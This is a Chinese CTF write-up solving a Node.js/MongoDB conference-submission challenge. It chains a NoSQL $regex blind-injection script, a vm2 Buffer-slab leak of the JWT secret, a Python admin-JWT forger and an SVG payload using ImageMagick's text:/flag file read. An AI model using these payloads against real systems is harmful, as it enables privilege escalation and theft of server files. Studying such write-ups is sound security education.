# AAA'26

## 题目简述

题目是 Node.js/Fastify/MongoDB 的学术会议投稿系统。普通用户只能投稿，reviewer 可以执行 vm2 表达式，admin 可以接收论文并触发 camera-ready PDF 转缩略图。利用链为：通过 NoSQL 布尔盲注获取 reviewer invite code，claim reviewer 后用 vm2 中的 Buffer slab 泄漏 JWT secret，伪造高权限 JWT，最后上传伪装成 PDF 的 SVG，让 ImageMagick 通过 `text:/flag` 把 flag 渲染到缩略图中。

## 解题过程

第一步是拿 reviewer 身份。普通用户可上传 reviewer service record，上传的 JSON 会被保存到 `retainedMetadata`：

```javascript
const record = {
  userId: new ObjectId(userId),
  retainedMetadata: profile.imported,
  summary: summarizeServiceRecord(profile.imported, profile.importedFilename),
  createdAt: now
};
```

用户提交 reviewer profile 后，状态保持为 `Submitted`。如果之后再上传 service record，提交状态不会回退，但 service desk 同步时会读取最新 record：

```javascript
const submitted = profile && profile.submitted;
const latestRecord = await latestReviewerServiceRecord(userId);
```

rubric 中 overflow reviewer slot 的字段映射为：

```javascript
const SERVICE_DESK_FIELDS = {
  overflowReference: ['committee', 'registration', 'reference']
};

const SERVICE_DESK_CREDENTIALS = {
  invitation: 'code'
};
```

因此用户控制的：

```text
committee.registration.reference
```

会进入 MongoDB 查询的 `code` 字段：

```javascript
function assignmentSlotQuery(submitted, rubric, packet) {
  return {
    used: false,
    track: submitted.track,
    kind: packet.queue,
    rubricId: rubric.rubricId,
    [packet.slotField]: packet.slotValue
  };
}
```

正常值是字符串；如果传入对象：

```json
{"$regex":"^a[0-9a-f]{35}$"}
```

查询就变成：

```javascript
{
  used: false,
  track: "systems",
  kind: "overflow",
  rubricId: "big1-overflow-systems",
  code: { "$regex": "^a[0-9a-f]{35}$" }
}
```

根据 service-sync 返回的文案判断正误：

```text
Committee service desk has an available assignment slot.
Committee service desk has not found an assignment slot yet.
```

逐位盲注 36 位 invite code：

```python
def probe_invite_code(prefix):
    remaining = 36 - len(prefix)
    pattern = f"^{prefix}[0-9a-f]{{{remaining}}}$"
    upload_service_record({
        "committee": {
            "registration": {
                "reference": {"$regex": pattern}
            }
        }
    })
    return service_sync_matches()
```

恢复完整 code 后，走正常 `/reviewer/claim` 流程获得 reviewer JWT。

第二步是泄漏 JWT secret。`/api/reviewer/filter` 会把 reviewer 提交的表达式放进 vm2 执行。执行前后端会先验证当前 token：

```javascript
const verified = await app.jwt.verify(token);
...
runReviewerExpression(expression, filterView(item));
```

JWT secret 通过 resolver 提供给 `@fastify/jwt`：

```javascript
await app.register(jwt, {
  secret: resolveJwtSecret,
  sign: { expiresIn: '24h' }
});
```

在底层 verifier 中，字符串 secret 会被转成 Buffer：

```javascript
if (typeof currentKey === 'string') {
  currentKey = Buffer.from(currentKey, 'utf-8');
}
```

Node 的小 Buffer 会复用 slab。`Buffer.from(Buffer.from("x").buffer)` 可以创建覆盖整个 backing `ArrayBuffer` 的 view，因而在 vm2 中能看到同进程近期放进 slab 的内容。JWT secret 格式为：

```text
aaa26_<48 hex chars>
```

用布尔表达式逐位探测：

```javascript
(() => {
  const slab = Buffer.from(Buffer.from("x").buffer).toString("latin1");
  const prefix = "aaa26_...";
  const rx = new RegExp(prefix + "[0-9a-f]{remaining}");
  return rx.test(slab);
})()
```

`/api/reviewer/filter` 的返回数量就是 oracle。泄漏出 JWT secret 后，直接按 HS256 重新签发当前用户的 JWT，把 payload 中的 `role` 改为 `admin` 即可访问 admin 接口：

```python
def forge_admin_jwt(secret, old_token):
    old = jwt_payload(old_token)
    now = int(time.time())
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {
        "id": old["id"],
        "username": old["username"],
        "role": "admin",
        "iat": now,
        "exp": now + 24 * 60 * 60,
    }
    signing_input = f"{b64url_json(header)}.{b64url_json(payload)}"
    sig = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
    return f"{signing_input}.{base64.urlsafe_b64encode(sig).rstrip(b'=').decode()}"
```

第三步是触发 camera-ready 渲染。以伪造 admin 身份创建 paper，并把状态设置为 `Accepted`，使其进入 camera-ready 上传流程。该流程使用 `pdf-image` 调用 ImageMagick 转缩略图。ImageMagick 读取输入时会识别真实文件格式，传入 `.pdf` 扩展名的 SVG 仍会按 SVG 处理；SVG 中的 `text:` 协议可以读取本地文本文件并作为图像内容渲染。

上传 payload：

```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg width="480" height="150" xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink">
  <rect width="480" height="150" fill="white"/>
  <svg x="0" y="38" width="480" height="112" viewBox="20 24 560 70" preserveAspectRatio="xMinYMin meet">
    <image href="text:/flag" xlink:href="text:/flag" x="0" y="0" width="612" height="792"/>
  </svg>
  <text x="18" y="30" font-size="18" fill="black">AAA'26 Big-1 Camera Ready</text>
</svg>
```

下载生成的 camera-ready thumbnail 后，OCR 或人工读取图中内容，得到：

```text
ACTF{c0ngr1ts_Accepted_wR1te_th0s_big1_0n_y0uR_re3uMe_FNpOoicPs8}
```

## 方法总结

- 核心技巧：把 MongoDB 查询对象注入、vm2 Buffer slab 信息泄漏、JWT 角色校验缺陷和 ImageMagick `text:` 文件读取串成完整权限链。
- 识别信号：用户上传 JSON 被保留为对象并进入 Mongo 查询时，要检查 `$regex` 等操作符注入；服务端图像转换接受用户文件时，要检查格式识别和协议读取。
- 复用要点：vm2 里不一定要直接 RCE，能泄漏 JWT secret 也足够完成权限提升；最终 SVG 即使以 `.pdf` 名称上传，ImageMagick 仍可能按内容识别。
